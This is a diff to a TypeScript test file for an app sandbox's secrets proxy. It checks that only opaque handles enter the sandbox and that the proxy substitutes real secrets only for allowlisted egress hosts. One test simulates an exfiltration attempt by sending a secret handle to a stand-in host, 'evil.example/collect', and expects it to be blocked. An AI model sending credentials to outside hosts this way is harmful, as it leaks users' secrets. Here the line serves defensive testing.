@@ -1,6 +1,10 @@
-import type { RunContext, SecretsProvider } from "@vendoai/core";
+import type { AppDocument, RunContext, SecretsProvider } from "@vendoai/core";
 import { describe, expect, it, vi } from "vitest";
 import { createApps } from "../index.js";
+import { createAppsProxy } from "../proxy.js";
+import { mintRunToken } from "../run-token.js";
+import type { AppDataAccess } from "../app-data.js";
+import type { IpResolver } from "../ssrf.js";
 import {
   basicLanguageModel,
   fakeSandbox,
@@ -10,22 +14,20 @@ import {
 } from "../testing/index.js";
 
 // ============================================================================
-// KEY RED-TEAM FINDING FOR SECRETS (documented, then proven):
+// SECRETS INVARIANT (ENG-259, updated from the pre-hardening "dead code" framing):
 //
-// machine.ts `environment()` injects each declared secret into the sandbox as an
-// OPAQUE HANDLE string `vendo-secret:<name>:<nonce>` — NOT the real value. The real
-// secret value is never placed in the machine's env, files, or any request the app
-// can read. The SecretsProvider.get() is not even consulted at boot.
+//   Real secret values resolve ONLY inside the proxy process, ONLY for egress toward
+//   an allowlisted host. They NEVER enter the sandbox: the machine's env carries only
+//   opaque per-boot handles (`vendo-secret:<name>:<nonce>`), and boot never reads the
+//   SecretsProvider.
 //
-// substituteSecretHandles (see egress-exfil.test.ts) is a PURE helper that a sandbox
-// egress adapter *could* call to swap a handle for its value on an allowlisted host.
-// But in the OSS e2b/modal path that helper is NOT wired in: nothing calls it, so the
-// real secret value is never present inside the sandbox at all. Exfiltration is
-// therefore impossible BY CONSTRUCTION — strictly stronger than the contract's
-// allowlist-gated substitution, because there is no value to exfiltrate.
-//
-// This test proves the injected-handle property end-to-end via the real createApps
-// open() path with a fake sandbox.
+// This replaces the earlier claim that substituteSecretHandles was unreachable dead
+// code ("safe by construction because nothing calls it"). It is now WIRED: the apps
+// proxy /egress route builds a handle→value map at request time and calls it — but
+// only after the host has passed the declared egress allowlist and the SSRF guard, so
+// a secret is read only when egress is actually permitted. Two properties, both proven
+// below: (1) the sandbox holds handles, not values, and boot does not read secrets;
+// (2) the proxy resolves a secret only for allowlisted egress, never otherwise.
 // ============================================================================
 
 const ctx: RunContext = {
@@ -34,6 +36,9 @@ const ctx: RunContext = {
   presence: "present",
   sessionId: "session_ada",
 };
+
+const tokenSecret = new TextEncoder().encode("wired-in-secrets-invariant-key-01");
+const publicResolver: IpResolver = async () => ["93.184.216.34"];
 
 describe("secret handles are injected, real values never enter the sandbox", () => {
   it("boots a machine whose env carries handles, not secret values, and never reads the provider", async () => {
@@ -67,5 +72,52 @@ describe("secret handles are injected, real values never enter the sandbox", () 
     expect(Object.values(env)).not.toContain(REAL_VALUE);
     // ...and the boot path never even asked the SecretsProvider for it.
     expect(get).not.toHaveBeenCalled();
+  });
+});
+
+describe("the proxy resolves a secret ONLY for allowlisted egress", () => {
+  const REAL = "sk_live_PROXY_ONLY";
+  const app = { format: "vendo/app@1", id: "app_wired", name: "Wired", egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] } as AppDocument;
+
+  const proxyWith = (fetchMock: typeof globalThis.fetch, resolveIp: IpResolver, get: SecretsProvider["get"]) =>
+    createAppsProxy({
+      tokenSecret,
+      tools: { async descriptors() { return []; }, async execute() { return { status: "blocked", reason: "no" }; } },
+      data: {} as AppDataAccess,
+      owns: async () => true,
+      loadApp: async () => app,
+      secrets: { get },
+      fetch: fetchMock,
+      resolveIp,
+    });
+
+  const token = async () => mintRunToken(tokenSecret, {
+    appId: app.id, subject: "user_ada", runId: "run_wired", presence: "present", expiresAt: Date.now() + 60_000,
+  });
+
+  const call = (bearer: string, url: string): Request => new Request("https://proxy.test/egress", {
+    method: "POST",
+    headers: { authorization: `Bearer ${bearer}`, "content-type": "application/json" },
+    body: JSON.stringify({ url, method: "POST", headers: { authorization: "Bearer vendo-secret:STRIPE_KEY:abc123" } }),
+  });
+
+  it("reads and substitutes the secret toward an allowlisted host", async () => {
+    const get = vi.fn(async () => REAL);
+    const fetchMock = vi.fn(async () => new Response("{}", { status: 200 })) as unknown as typeof globalThis.fetch;
+    const proxy = proxyWith(fetchMock, publicResolver, get);
+    await proxy.handler(call(await token(), "https://api.stripe.com/v1/charges"));
+    expect(get).toHaveBeenCalledWith("STRIPE_KEY");
+    const headers = (fetchMock as unknown as ReturnType<typeof vi.fn>).mock.calls[0][1].headers as Record<string, string>;
+    expect(headers.authorization).toBe(`Bearer ${REAL}`);
+  });
+
+  it("never reads the secret toward a non-allowlisted host", async () => {
+    const get = vi.fn(async () => REAL);
+    const fetchMock = vi.fn(async () => new Response("{}", { status: 200 })) as unknown as typeof globalThis.fetch;
+    const proxy = proxyWith(fetchMock, publicResolver, get);
+    const response = await proxy.handler(call(await token(), "https://evil.example/collect"));
+    expect(response.status).toBe(403);
+    expect(get).not.toHaveBeenCalled();
+    expect(fetchMock).not.toHaveBeenCalled();
   });
 });
